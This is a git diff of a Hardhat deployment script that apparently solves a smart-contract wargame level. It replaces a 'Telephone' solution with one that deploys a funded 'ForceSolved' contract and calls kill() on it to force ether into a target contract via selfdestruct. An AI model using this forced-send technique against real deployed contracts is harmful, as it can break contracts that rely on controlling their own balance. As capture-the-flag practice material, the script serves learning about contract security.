@@ -2,6 +2,7 @@
 // but useful for running the script in a standalone fashion through `node <script>`.
 // When running the script with `hardhat run <script>` you'll find the Hardhat
 // Runtime Environment's members available in the global scope.
+import { parseEther, parseUnits } from 'ethers/lib/utils';
 import { ethers } from 'hardhat';
 
 
@@ -12,24 +13,24 @@ async function main(): Promise<void> {
   // await run("compile");
   // We get the contract to deploy
   const [deployer] = await ethers.getSigners();
-  const telephoneAddress = "0x128166A27eD75826C7D83733669620Ae634Ef44F"
-
+  const forceAddress = "0x23fa4eFf0d0E75d9E9CC7E0d2ccCA37CC3DDe502"
   console.log(deployer.address);
-  const TelephoneFactory = await ethers.getContractFactory("Telephone");
-  const TelephoneSolvedFactory = await ethers.getContractFactory("TelephoneSolved");
-  const telephone = TelephoneFactory.attach(telephoneAddress);
-  console.log('telephone deployed to: ', telephone.address);
 
-  const telephoneSolved = await TelephoneSolvedFactory.deploy(telephone.address);
-  await telephoneSolved.deployed()
-  console.log('telephoneSolved deployed to: ', telephone.address);
+  const ForceSolvedFactory = await ethers.getContractFactory("ForceSolved");
+  const forceSolved = await ForceSolvedFactory.deploy({
+    value: parseEther("0.0001"), 
+    gasLimit: parseUnits("100000", "1")
+  });
+  await forceSolved.deployed()
+  console.log('forceSolved deployed to: ', forceSolved.address);
 
-  /*
-  const tx = await telephoneSolved.claim(deployer.address)
+  // suiciding a contract can send funds to receiver contract
+  // the fallback function of the receiver function is not called in this case
+  const tx = await forceSolved.kill(forceAddress)
   console.log(tx)
   const receipt = await tx.wait()
   console.log(receipt)
-  */
+  
   
 } 
 
